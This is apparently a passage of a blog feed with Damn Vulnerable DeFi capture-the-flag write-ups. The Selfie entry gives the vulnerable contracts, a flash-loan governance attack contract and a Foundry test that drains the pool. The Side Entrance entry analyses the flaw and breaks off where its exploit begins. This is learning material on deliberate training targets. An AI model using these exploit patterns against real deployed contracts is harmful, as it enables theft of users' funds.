class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;../../lib/openzeppelin-contracts/contracts/security/ReentrancyGuard.sol&quot;;</span><br><span class="line">import &quot;../../lib/openzeppelin-contracts/contracts/token/ERC20/extensions/ERC20Snapshot.sol&quot;;</span><br><span class="line">import &quot;../../lib/openzeppelin-contracts/contracts/interfaces/IERC3156FlashLender.sol&quot;;</span><br><span class="line">import &quot;../../lib/openzeppelin-contracts/contracts/interfaces/IERC3156FlashBorrower.sol&quot;;</span><br><span class="line">import &quot;./SimpleGovernance.sol&quot;;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @title SelfiePool</span><br><span class="line"> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span><br><span class="line"> */</span><br><span class="line">contract SelfiePool is ReentrancyGuard, IERC3156FlashLender &#123;</span><br><span class="line">    ERC20Snapshot public immutable token;</span><br><span class="line">    SimpleGovernance public immutable governance;</span><br><span class="line">    bytes32 private constant CALLBACK_SUCCESS = keccak256(&quot;ERC3156FlashBorrower.onFlashLoan&quot;);</span><br><span class="line"></span><br><span class="line">    error RepayFailed();</span><br><span class="line">    error CallerNotGovernance();</span><br><span class="line">    error UnsupportedCurrency();</span><br><span class="line">    error CallbackFailed();</span><br><span class="line"></span><br><span class="line">    event FundsDrained(address indexed receiver, uint256 amount);</span><br><span class="line"></span><br><span class="line">    modifier onlyGovernance() &#123;</span><br><span class="line">        if (msg.sender != address(governance)) revert CallerNotGovernance();</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    constructor(address _token, address _governance) &#123;</span><br><span class="line">        token = ERC20Snapshot(_token);</span><br><span class="line">        governance = SimpleGovernance(_governance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function maxFlashLoan(address _token) external view returns (uint256) &#123;</span><br><span class="line">        if (address(token) == _token) return token.balanceOf(address(this));</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flashFee(address _token, uint256) external view returns (uint256) &#123;</span><br><span class="line">        if (address(token) != _token) revert UnsupportedCurrency();</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flashLoan(IERC3156FlashBorrower _receiver, address _token, uint256 _amount, bytes calldata _data)</span><br><span class="line">        external</span><br><span class="line">        nonReentrant</span><br><span class="line">        returns (bool)</span><br><span class="line">    &#123;</span><br><span class="line">        if (_token != address(token)) revert UnsupportedCurrency();</span><br><span class="line"></span><br><span class="line">        token.transfer(address(_receiver), _amount);</span><br><span class="line">        if (_receiver.onFlashLoan(msg.sender, _token, _amount, 0, _data) != CALLBACK_SUCCESS) revert CallbackFailed();</span><br><span class="line"></span><br><span class="line">        if (!token.transferFrom(address(_receiver), address(this), _amount)) &#123;</span><br><span class="line">            revert RepayFailed();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function emergencyExit(address receiver) external onlyGovernance &#123;</span><br><span class="line">        uint256 amount = token.balanceOf(address(this));</span><br><span class="line">        token.transfer(receiver, amount);</span><br><span class="line"></span><br><span class="line">        emit FundsDrained(receiver, amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></details><p><code>ISimpleGovernance.sol</code>:</p><details><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface ISimpleGovernance &#123;</span><br><span class="line">    struct GovernanceAction &#123;</span><br><span class="line">        uint128 value;</span><br><span class="line">        uint64 proposedAt;</span><br><span class="line">        uint64 executedAt;</span><br><span class="line">        address target;</span><br><span class="line">        bytes data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    error NotEnoughVotes(address who);</span><br><span class="line">    error CannotExecute(uint256 actionId);</span><br><span class="line">    error InvalidTarget();</span><br><span class="line">    error TargetMustHaveCode();</span><br><span class="line">    error ActionFailed(uint256 actionId);</span><br><span class="line"></span><br><span class="line">    event ActionQueued(uint256 actionId, address indexed caller);</span><br><span class="line">    event ActionExecuted(uint256 actionId, address indexed caller);</span><br><span class="line"></span><br><span class="line">    function queueAction(address target, uint128 value, bytes calldata data) external returns (uint256 actionId);</span><br><span class="line"></span><br><span class="line">    function executeAction(uint256 actionId) external payable returns (bytes memory returndata);</span><br><span class="line"></span><br><span class="line">    function getActionDelay() external view returns (uint256 delay);</span><br><span class="line"></span><br><span class="line">    function getGovernanceToken() external view returns (address token);</span><br><span class="line"></span><br><span class="line">    function getAction(uint256 actionId) external view returns (GovernanceAction memory action);</span><br><span class="line"></span><br><span class="line">    function getActionCounter() external view returns (uint256);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></details><p><code>SimpleGovernance.sol</code>:</p><details><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;../DamnValuableTokenSnapshot.sol&quot;;</span><br><span class="line">import &quot;./ISimpleGovernance.sol&quot;;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @title SimpleGovernance</span><br><span class="line"> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span><br><span class="line"> */</span><br><span class="line">contract SimpleGovernance is ISimpleGovernance &#123;</span><br><span class="line">    uint256 private constant ACTION_DELAY_IN_SECONDS = 2 days;</span><br><span class="line">    DamnValuableTokenSnapshot private _governanceToken;</span><br><span class="line">    uint256 private _actionCounter;</span><br><span class="line">    mapping(uint256 =&gt; GovernanceAction) private _actions;</span><br><span class="line"></span><br><span class="line">    constructor(address governanceToken) &#123;</span><br><span class="line">        _governanceToken = DamnValuableTokenSnapshot(governanceToken);</span><br><span class="line">        _actionCounter = 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function queueAction(address target, uint128 value, bytes calldata data) external returns (uint256 actionId) &#123;</span><br><span class="line">        if (!_hasEnoughVotes(msg.sender)) revert NotEnoughVotes(msg.sender);</span><br><span class="line"></span><br><span class="line">        if (target == address(this)) revert InvalidTarget();</span><br><span class="line"></span><br><span class="line">        if (data.length &gt; 0 &amp;&amp; target.code.length == 0) &#123;</span><br><span class="line">            revert TargetMustHaveCode();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        actionId = _actionCounter;</span><br><span class="line"></span><br><span class="line">        _actions[actionId] = GovernanceAction(&#123;</span><br><span class="line">            target: target,</span><br><span class="line">            value: value,</span><br><span class="line">            proposedAt: uint64(block.timestamp),</span><br><span class="line">            executedAt: 0,</span><br><span class="line">            data: data</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        unchecked &#123;</span><br><span class="line">            _actionCounter++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        emit ActionQueued(actionId, msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function executeAction(uint256 actionId) external payable returns (bytes memory) &#123;</span><br><span class="line">        if (!_canBeExecuted(actionId)) revert CannotExecute(actionId);</span><br><span class="line"></span><br><span class="line">        GovernanceAction storage actionToExecute = _actions[actionId];</span><br><span class="line">        actionToExecute.executedAt = uint64(block.timestamp);</span><br><span class="line"></span><br><span class="line">        emit ActionExecuted(actionId, msg.sender);</span><br><span class="line"></span><br><span class="line">        (bool success, bytes memory returndata) =</span><br><span class="line">            actionToExecute.target.call&#123;value: actionToExecute.value&#125;(actionToExecute.data);</span><br><span class="line">        if (!success) &#123;</span><br><span class="line">            if (returndata.length &gt; 0) &#123;</span><br><span class="line">                assembly &#123;</span><br><span class="line">                    revert(add(0x20, returndata), mload(returndata))</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                revert ActionFailed(actionId);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return returndata;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getActionDelay() external pure returns (uint256) &#123;</span><br><span class="line">        return ACTION_DELAY_IN_SECONDS;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getGovernanceToken() external view returns (address) &#123;</span><br><span class="line">        return address(_governanceToken);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getAction(uint256 actionId) external view returns (GovernanceAction memory) &#123;</span><br><span class="line">        return _actions[actionId];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getActionCounter() external view returns (uint256) &#123;</span><br><span class="line">        return _actionCounter;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev an action can only be executed if:</span><br><span class="line">     * 1) it&#x27;s never been executed before and</span><br><span class="line">     * 2) enough time has passed since it was first proposed</span><br><span class="line">     */</span><br><span class="line">    function _canBeExecuted(uint256 actionId) private view returns (bool) &#123;</span><br><span class="line">        GovernanceAction memory actionToExecute = _actions[actionId];</span><br><span class="line"></span><br><span class="line">        if (actionToExecute.proposedAt == 0) &#123;</span><br><span class="line">            // early exit</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        uint64 timeDelta;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            timeDelta = uint64(block.timestamp) - actionToExecute.proposedAt;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return actionToExecute.executedAt == 0 &amp;&amp; timeDelta &gt;= ACTION_DELAY_IN_SECONDS;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _hasEnoughVotes(address who) private view returns (bool) &#123;</span><br><span class="line">        uint256 balance = _governanceToken.getBalanceAtLastSnapshot(who);</span><br><span class="line">        uint256 halfTotalSupply = _governanceToken.getTotalSupplyAtLastSnapshot() / 2;</span><br><span class="line">        return balance &gt; halfTotalSupply;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></details><h2 id="Observation"><a href="#Observation" class="headerlink" title="Observation"></a>Observation</h2><ul><li><code>SimpleGovernance</code>: 治理合约，实现了ISimpleGovernance接口，可以预先设置action，在两天后执行。</li><li><code>SelfiePool</code>:闪电贷，包括Snapshot和SimpleGovernance两种token。</li></ul><h2 id="Vuln"><a href="#Vuln" class="headerlink" title="Vuln"></a>Vuln</h2><ul><li>SelfiePool::emergencyExit<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function emergencyExit(address receiver) external onlyGovernance &#123;</span><br><span class="line">        uint256 amount = token.balanceOf(address(this));</span><br><span class="line">        token.transfer(receiver, amount);</span><br><span class="line"></span><br><span class="line">        emit FundsDrained(receiver, amount);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>为了调用emergencyExit，得先成为<code>onlyGovernance</code>.<br>通过<code>SimpleGovernance::_hasEnoughVotes</code><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function _hasEnoughVotes(address who) private view returns (bool) &#123;</span><br><span class="line">        uint256 balance = _governanceToken.getBalanceAtLastSnapshot(who);</span><br><span class="line">        uint256 halfTotalSupply = _governanceToken.getTotalSupplyAtLastSnapshot() / 2;</span><br><span class="line">        return balance &gt; halfTotalSupply;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>得使<code>balance &gt; halfTotalSupply;</code>,所以我们要用闪电贷。<br>同时<code>SimpleGovernance::queueAction</code>要求一定要是合约调用<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if (data.length &gt; 0 &amp;&amp; target.code.length == 0) &#123;</span><br><span class="line"></span><br><span class="line">revert TargetMustHaveCode();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">import &#123;SelfiePool, SimpleGovernance, DamnValuableTokenSnapshot&#125; from &quot;./SelfiePool.sol&quot;;</span><br><span class="line">import &quot;../../lib/openzeppelin-contracts/contracts/interfaces/IERC3156FlashBorrower.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract SelfiePoolAttacker is IERC3156FlashBorrower &#123;</span><br><span class="line">    SelfiePool pool;</span><br><span class="line">    SimpleGovernance governance;</span><br><span class="line">    DamnValuableTokenSnapshot token;</span><br><span class="line">    address owner;</span><br><span class="line">    uint256 actionId;</span><br><span class="line"></span><br><span class="line">    constructor(address _pool, address _governance, address _token) &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        pool = SelfiePool(_pool);</span><br><span class="line">        governance = SimpleGovernance(_governance);</span><br><span class="line">        token = DamnValuableTokenSnapshot(_token);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack(uint256 amount) public &#123;</span><br><span class="line">        // call flashloan</span><br><span class="line">        pool.flashLoan(IERC3156FlashBorrower(this), address(token), amount, &quot;0x&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function onFlashLoan(address initiator, address _token, uint256 amount, uint256 fee, bytes calldata data)</span><br><span class="line">        external</span><br><span class="line">        returns (bytes32)</span><br><span class="line">    &#123;</span><br><span class="line">        // queue action</span><br><span class="line">        token.snapshot();</span><br><span class="line">        actionId = governance.queueAction(address(pool), 0, abi.encodeWithSignature(&quot;emergencyExit(address)&quot;, owner));</span><br><span class="line">        token.approve(address(pool), amount);</span><br><span class="line">        return keccak256(&quot;ERC3156FlashBorrower.onFlashLoan&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function executeAction() public &#123;</span><br><span class="line">        governance.executeAction(actionId);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>SelfiTest.t.sol：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;../../src/6-selfie/ISimpleGovernance.sol&quot;;</span><br><span class="line">import &quot;../../src/6-selfie/SimpleGovernance.sol&quot;;</span><br><span class="line">import &quot;../../src/6-selfie/SelfiePool.sol&quot;;</span><br><span class="line">import &quot;../../src/DamnValuableTokenSnapshot.sol&quot;;</span><br><span class="line">import &quot;../../src/6-selfie/SelfirAttack.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract SelfirTest is Test &#123;</span><br><span class="line">    uint256 constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;</span><br><span class="line">    uint256 constant TOKENS_IN_POOL = 1_500_000e18;</span><br><span class="line"></span><br><span class="line">    SelfiePool public pool;</span><br><span class="line">    SimpleGovernance public governance;</span><br><span class="line">    DamnValuableTokenSnapshot public dvttoken;</span><br><span class="line"></span><br><span class="line">    address player;</span><br><span class="line">    address deployer;</span><br><span class="line"></span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        dvttoken = new DamnValuableTokenSnapshot(TOKEN_INITIAL_SUPPLY);</span><br><span class="line">        governance = new SimpleGovernance(address(dvttoken));</span><br><span class="line">        pool = new SelfiePool(address(dvttoken), address(governance));</span><br><span class="line">        dvttoken.transfer(address(pool), TOKENS_IN_POOL);</span><br><span class="line">        dvttoken.snapshot();</span><br><span class="line">        //attacker = new SelfiePoolAttacker(address(pool), address(governance), address(dvttoken));</span><br><span class="line">        player = makeAddr(&quot;player&quot;);</span><br><span class="line">        deployer = makeAddr(&quot;deployer&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testSetupIsdown() public &#123;</span><br><span class="line">        assertEq(governance.getActionCounter(), 1);</span><br><span class="line"></span><br><span class="line">        assertEq(dvttoken.balanceOf(address(pool)), TOKENS_IN_POOL);</span><br><span class="line">        assertEq(pool.maxFlashLoan(address(dvttoken)), TOKENS_IN_POOL);</span><br><span class="line">        assertEq(pool.flashFee(address(dvttoken), 0), 0);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testExploit() public &#123;</span><br><span class="line">        /**</span><br><span class="line">         * CODE YOUR SOLUTION HERE*</span><br><span class="line">         */</span><br><span class="line">        vm.startPrank(player);</span><br><span class="line">        SelfiePoolAttacker attacker = new SelfiePoolAttacker(address(pool), address(governance), address(dvttoken));</span><br><span class="line">        attacker.attack(TOKENS_IN_POOL);</span><br><span class="line">        vm.warp(block.timestamp + 2 days);</span><br><span class="line">        attacker.executeAction();</span><br><span class="line">        vm.stopPrank();</span><br><span class="line">        validation();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function validation() public &#123;</span><br><span class="line">        assertEq(dvttoken.balanceOf(address(player)), TOKENS_IN_POOL);</span><br><span class="line">        assertEq(dvttoken.balanceOf(address(pool)), 0);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> DamnVulnerableDefi </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DamnVulnerableDeFi-5</title>
      <link href="/2023/12/29/DamnVulnerableDeFi-5/"/>
      <url>/2023/12/29/DamnVulnerableDeFi-5/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> DamnVulnerableDefi </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DamnVulnerableDeFi-4</title>
      <link href="/2023/12/29/DamnVulnerableDeFi-4/"/>
      <url>/2023/12/29/DamnVulnerableDeFi-4/</url>
      
        <content type="html"><![CDATA[<h1 id="Side-Entrance"><a href="#Side-Entrance" class="headerlink" title="Side Entrance"></a>Side Entrance</h1><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">A surprisingly simple pool allows anyone to deposit ETH, and withdraw it at any point in time.</span><br><span class="line"></span><br><span class="line">It has 1000 ETH in balance already, and is offering free flash loans using the deposited ETH to promote their system.</span><br><span class="line"></span><br><span class="line">Starting with 1 ETH in balance, pass the challenge by taking all ETH from the pool.</span><br></pre></td></tr></table></figure><h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;solady/src/utils/SafeTransferLib.sol&quot;;</span><br><span class="line"></span><br><span class="line">interface IFlashLoanEtherReceiver &#123;</span><br><span class="line">    function execute() external payable;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @title SideEntranceLenderPool</span><br><span class="line"> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span><br><span class="line"> */</span><br><span class="line">contract SideEntranceLenderPool &#123;</span><br><span class="line">    mapping(address =&gt; uint256) private balances;</span><br><span class="line"></span><br><span class="line">    error RepayFailed();</span><br><span class="line"></span><br><span class="line">    event Deposit(address indexed who, uint256 amount);</span><br><span class="line">    event Withdraw(address indexed who, uint256 amount);</span><br><span class="line"></span><br><span class="line">    function deposit() external payable &#123;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            balances[msg.sender] += msg.value;</span><br><span class="line">        &#125;</span><br><span class="line">        emit Deposit(msg.sender, msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() external &#123;</span><br><span class="line">        uint256 amount = balances[msg.sender];</span><br><span class="line">        </span><br><span class="line">        delete balances[msg.sender];</span><br><span class="line">        emit Withdraw(msg.sender, amount);</span><br><span class="line"></span><br><span class="line">        SafeTransferLib.safeTransferETH(msg.sender, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flashLoan(uint256 amount) external &#123;</span><br><span class="line">        uint256 balanceBefore = address(this).balance;</span><br><span class="line"></span><br><span class="line">        IFlashLoanEtherReceiver(msg.sender).execute&#123;value: amount&#125;();</span><br><span class="line"></span><br><span class="line">        if (address(this).balance &lt; balanceBefore)</span><br><span class="line">            revert RepayFailed();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Observation"><a href="#Observation" class="headerlink" title="Observation"></a>Observation</h2><p>The contract realize a lender pool , and have a free flashloan, one interface.</p><p>There are there function:<code>deposit()</code>,<code>withdraw()</code>,<code>flashloan()</code>.</p><p>The Vuln is in flashloan function:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function flashLoan(uint256 amount) external &#123;</span><br><span class="line">uint256 balanceBefore = address(this).balance;</span><br><span class="line"></span><br><span class="line">IFlashLoanEtherReceiver(msg.sender).execute&#123;value: amount&#125;();</span><br><span class="line"></span><br><span class="line">if (address(this).balance &lt; balanceBefore) revert RepayFailed();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>especially<code>if (address(this).balance &lt; balanceBefore) revert RepayFailed();</code><br>it only check the contract.balance !!! </p><p>so if we use flashloan first , then we deposit it to the contract . The balanceof(pool) didn’t change . we Pass the check !!!</p><p>after all , we can call withdraw() to make balanace become zero.</p><h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><p><code>Exp.sol</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 